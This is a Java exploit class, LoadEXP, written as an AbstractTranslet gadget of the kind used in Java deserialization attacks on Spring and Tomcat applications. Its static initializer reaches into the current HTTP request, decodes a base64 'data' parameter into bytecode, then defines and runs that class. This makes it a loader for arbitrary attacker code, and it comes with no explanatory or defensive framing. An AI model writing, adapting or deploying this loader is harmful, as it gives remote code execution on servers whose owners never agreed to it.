package org.example.toolong;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.tomcat.util.codec.binary.Base64;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Field;

public class LoadEXP extends AbstractTranslet {

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

	}

	// Internal ClassLoader
	public static class DefineLoader extends ClassLoader {
		public Class load(byte[] bytes) {
			return super.defineClass(null, bytes, 0, bytes.length);
		}
	}

	static  {
		try {
			// Get request in Spring Framework
			ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
			// RequestFacade
			assert attributes != null;
			HttpServletRequest requestFacade = attributes.getRequest();
			Field requestField = requestFacade.getClass().getDeclaredField("request");
			requestField.setAccessible(true);
			// Request
			Request request = (Request) requestField.get(requestFacade);
			// Get parameter
			String dataB64 = request.getParameter("data");

			if (dataB64 != null) {
				byte[] bytes = Base64.decodeBase64(dataB64);
				Class clazz = new DefineLoader().load(bytes);
				clazz.newInstance().toString();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}

